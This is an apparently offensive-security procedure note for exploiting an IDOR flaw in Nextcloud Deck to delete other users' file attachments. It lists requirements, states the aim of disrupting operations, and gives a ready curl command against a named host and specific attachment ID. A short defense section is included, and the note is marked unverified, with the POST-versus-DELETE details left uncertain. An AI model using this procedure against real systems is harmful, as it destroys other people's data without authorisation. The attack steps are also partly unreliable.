---
id: p4b2c3d4-e5f6-7890-abcd-ef1234567894
tags:
  - idor
  - deletion
  - integrity-violation
type: procedure
tools: []
tactics:
  - '[[Privilege Escalation]]'
commands:
  - '[[commands/curl-delete-attachment]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data Destruction]]'
updated_at: '2025-12-14T17:29:28.643Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Privilege Escalation]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data Destruction]]'
---
# Delete-Unauthorized-Attachments-via-IDOR

## Summary

This procedure uses the IDOR vulnerability to delete attachments belonging to other users in Nextcloud Deck, violating data integrity and availability.

## Description

Leveraging the same URL structure without access checks, send a delete request to the attachment endpoint from an unauthorized session. This removes the file from the original task, affecting the owner's ability to access their data. Demonstrated via API calls or UI manipulation.

## Requirements

1. Known attachment URL with ID.
2. Authenticated unauthorized session.
3. Ability to send DELETE or POST requests (browser tools or curl).

## Defense

Defensive measures and detection strategies:

- Require explicit ownership validation before deletions.
- Audit all delete operations for cross-user anomalies.
- Implement soft deletes with recovery options.

## Objectives

1. Remove unauthorized files to disrupt operations.
2. Demonstrate integrity and availability impacts.
3. Escalate from read to write access via IDOR.

## Instructions

### Step 1: Identify Target Attachment

**Context**: Select a known vulnerable attachment URL from prior enumeration.

Use a URL like https://us.cloudamo.com/apps/deck/cards/8420/attachment/30.

**Expected Output**: Confirmed accessible file.

### Step 2: Send Delete Request

**Context**: Issue a delete action on the endpoint.

Use curl to simulate the delete (adapt from observed UI requests, often a POST to a delete action):

Execute [[commands/curl-delete-attachment]] to remove:

```bash
curl -X POST -u "UserB:password" -H "OCS-APIRequest: true" https://us.cloudamo.com/ocs/v2.php/apps/deck/api/v1.0/cards/8420/attachments/30 -d "format=json"
```

> Expect 200 OK with deletion confirmation; verify by re-accessing the URL (should 404).

**Expected Output**: Attachment deleted; original owner sees it missing.

## MITRE ATT&CK Mapping

### Tactics

- [[Privilege Escalation]] Privilege Escalation

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Data Destruction]] Data Destruction

### Sub-Techniques


## Commands Used

- [[commands/curl-delete-attachment]]

## Tools Used


## Tags

- idor
- deletion
